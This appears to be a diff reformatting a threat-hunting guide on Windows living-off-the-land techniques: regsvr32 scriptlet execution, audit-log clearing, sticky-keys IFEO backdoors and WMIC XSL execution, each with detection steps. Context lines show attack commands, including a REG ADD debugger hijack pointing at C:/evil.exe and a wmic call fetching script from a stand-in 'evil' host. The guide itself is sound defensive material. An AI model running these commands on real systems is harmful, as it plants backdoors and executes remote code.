@@ -19,11 +19,11 @@ In computing, regsvr32 (Microsoft Register Server) is a command-line utility in 
 `regsvr32` is invoking scrobj.dll to unregister COM objects defined in the evil.sct. Malicious code will be used in the sct file.
 The SCT file ( an XML file) has a registration tag in it that can contain VBScript or JScript code.  The file can have any extension.It doesn’t have to be `.sct`. There will be no artifacts left in registry if this utility is unregistering any COM object.
 
-`Detection`:
-1.Look for regsvr32.exe prefetch files and Parsing the prefetch will provide the executed file. 
-2.Command execution and arguments passed to regsvr32.exe using EDR solutions.
-3.Look for suspicious process in the system with parent process as regsvr32.
-4. Hunt for Windows event id 4688 and filter the command arguments with following filter
+<u>Detection:</u>
+- Look for regsvr32.exe prefetch files and Parsing the prefetch will provide the executed file. 
+- Command execution and arguments passed to regsvr32.exe using EDR solutions.
+- Look for suspicious process in the system with parent process as regsvr32.
+- Hunt for Windows event id 4688 and filter the command arguments with following filter
 `regSvr32 /s /n /u /i:http`
 
 Note: This utility invokes default HTTP useragent based on your system settings.
@@ -36,8 +36,8 @@ Detailed Tracking have to be enabled for recording process command arguments.
 
 Adversaries may clear the Windows audit logs to remove its footpath. Whenver audit logs are cleared , Windows triggers event id 104 or 1102 or 517.Look for these event ids in the machine and start your analysis.
 
-`Detection`:
-1. Look for Event IDs 104,1102,517
+<u>Detection:</u>
+- Look for Event IDs 104,1102,517
 
 ### **<u>Bypass Authentication</u>**
 
@@ -53,7 +53,7 @@ displayswitch.exe
 
 `REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /d "C:/evil.exe"`
 
-`Detection`:
+<u>Detection:</u>
   Sweep all the executables under below mentioned registry path  "Image File Execution Options" and look for "debugger" key name.
   
 Registry Path:
@@ -70,9 +70,9 @@ WMIC shell is a windows utility that provide command line interface for WMI(Wind
 `wmic os get /FORMAT:"http://evil/evil[.]xsl"`
 XSL script (eXtensible Stylesheet Language). WMI can invoke javascript or VBscript using XSL
 
-`Detection`:
-1.WMIC.exe prefetch files and Parsing the prefetch will provide the downloaded file. 
-2.Command execution and arguments passed to wmic.exe using EDR solutions.
-3.Look for Windows event id 4688 and search the process command arguments with this utility names as a keyword along with below syntax 
+<u>Detection:</u>
+- WMIC.exe prefetch files and Parsing the prefetch will provide the downloaded file. 
+- Command execution and arguments passed to wmic.exe using EDR solutions.
+- Look for Windows event id 4688 and search the process command arguments with this utility names as a keyword along with below syntax 
 `wmic os get /FORMAT:"http:/"`
-4.Look for http request for file/page ending with XSL from proxy log or Network recorder.
+- Look for http request for file/page ending with XSL from proxy log or Network recorder.
